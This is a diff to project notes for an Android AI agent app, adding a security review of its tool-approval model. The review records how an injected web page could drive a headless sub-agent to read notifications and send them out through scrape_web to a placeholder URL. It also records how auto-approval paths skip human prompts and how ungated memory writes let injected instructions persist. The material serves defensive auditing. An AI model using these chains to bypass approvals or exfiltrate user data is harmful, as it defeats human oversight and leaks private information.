@@ -27,7 +27,7 @@ Local agent on Vivo X300 (12 GB, Dimensity 9500): RikkaHub → AICore (ML Kit Pr
 ## Testing without Android build
 Google Maven (dl.google.com) is blocked in the cloud sandbox → no AGP/Gradle build there.
 `scripts/host-test/run.sh` compiles the Android-free sources with a standalone kotlinc and runs
-98 JUnit tests + a scenario driver that runs the real `AICoreProvider.streamText` against a
+102 JUnit tests + a scenario driver that runs the real `AICoreProvider.streamText` against a
 scripted **fake** ML Kit (`scripts/host-test/stubs`, shape only, not the real AAR).
 On a dev machine the same JUnit tests run with `./gradlew :ai:testDebugUnitTest :workspace:testDebugUnitTest :app:testDebugUnitTest`.
 The repo has no CI.
@@ -138,6 +138,57 @@ BUILD_ANDROID.md, then work the checklist below.
     done here since it was not asked for and would widen the shell's reach.
 - See the PRoot `/proc` entry above (Open risks) for the host probe of the escape
   hypothesis — falsified for a generic x86_64 proot build, unresolved for the real binary.
+
+## Sprint 3 (2026-09-25) — approval model, headless, data egress (static analysis, HOST ONLY)
+Approval path (reconstructed end to end):
+tool factory → `needsApproval` lambda → `GenerationLoop` (Hardline first; prompts ONLY when
+`needsApproval(input)` is true) → `isToolAutoApproved` in `ChatService` =
+YOLO || `HeadlessConversations.shouldAutoApprove(conv)` || "Allow for this chat" || always-allow set
+(workspace tools excluded) → Pending (UI / Telegram keyboard) or execute.
+`ToolApprovalDefaults.ALWAYS_ASK` becomes `needsApproval` only via `ToolApprovalDefaults.applyTo`
+(LocalTools, search tools); MCP tools use `requiresApproval(mcp__…)` in ChatService.
+`ChatToolFactory.createTools` is dead code (never called).
+
+- [CONFIRMED→MITIGATED] c7a1c46 listed scrape_web in ALWAYS_ASK but search tools skip the
+  LocalTools mapping, so it still ran unprompted (its test only checked set membership).
+  Fixed in 7c0f8d9 via `applyTo`; SearchToolsTest checks the real tool (Gradle), host covers applyTo.
+- [CONFIRMED] `NO_ALWAYS_ALLOW` is UI-only: it hides the "Always Allow" button (chat + Telegram).
+  Runtime never checks it, so it does not hold under YOLO, fully headless runs, or
+  "Allow for this chat" (still offered for eval_javascript / keystore_decrypt / mcp_add …).
+- [CONFIRMED] Fully headless = every tool auto-approved, NO_ALWAYS_ALLOW included. Triggers:
+  CronJobWorker, SubAgentEngine (`subagent_dispatch`), SkillTestRunner, ExternalAutomationDispatcher.
+  Telegram is browser-headless only (keeps its approval keyboard). Workflows run pre-authorised
+  fixed actions (approved at `workflow_create`) — a sounder model. Floors still apply everywhere:
+  Hardline, PathSafetyGuard, SSRF guard.
+- [CONFIRMED, static chain, not executed] Approval laundering: one approval of
+  `subagent_dispatch` (zero if Always-Allowed, zero inside cron) starts a headless run on the
+  parent assistant with all its tools auto-approved, e.g. injected page → sub-agent →
+  `list_recent_notifications` → `scrape_web("https://x/?d=…")`. Needs one human tap at most.
+- [FALSIFIED] Backdoor via `external_automation_add_trusted_package("<adb>")` (which would let any
+  app drive the exported RUN_TASK receiver): the tool's package regex rejects "<adb>". The
+  activity path uses binder-verified `callingPackage` (correct).
+- [CONFIRMED] Doc mismatch: ExternalAutomationTools KDoc says its mutating tools are
+  NO_ALWAYS_ALLOW; they are only in ALWAYS_ASK.
+- [CONFIRMED] `memory_tool` (create/edit/delete) is ungated: an injected turn can persist instructions into
+  memory that are replayed in future chats (persistence, not egress).
+- Markdown images (unchanged, [CONFIRMED] Sprint 1): `Markdown.kt` IMAGE → Coil, auto-load, no
+  approval, no SSRF guard. `search_web`'s own description tells the model to embed `![](url)`
+  from `images[]`, so a blanket block breaks that feature.
+
+[REQUIRES PRODUCT DECISION] Headless policy — cannot tell from code whether NO_ALWAYS_ALLOW was
+meant to hold headless (its KDoc names unattended cron; `mark()`'s KDoc says "tools auto-approve").
+Proposed minimal policy, not implemented:
+1. Headless/YOLO/chat-scope: NO_ALWAYS_ALLOW tools → Denied with an envelope (never Pending: no
+   one can answer). Breaks only cron/sub-agent/external runs that use those 9 tools.
+2. `subagent_dispatch`: the sub-agent inherits the parent's approval state instead of auto-approve
+   (Pending surfaces in the parent chat), or run with read/local-only tools.
+3. Headless network egress (web_fetch, web_extract, scrape_web, browser_open, telegram_send_*,
+   ssh_*, mcp__*): allowed only if listed on that cron job / automation (per-job allowlist).
+4. Markdown images: auto-load only URLs that already appeared in a tool result of the same
+   conversation; others become tap-to-load.
+
+Dell/Vivo checks added by Sprint 3: `./gradlew :app:testDebugUnitTest --tests '*SearchToolsTest*'`;
+on device, `scrape_web` and `list_recent_notifications` must show an approval card.
 
 ## Next steps (priority order)
 1. Build + Vivo checklist above; record results here.
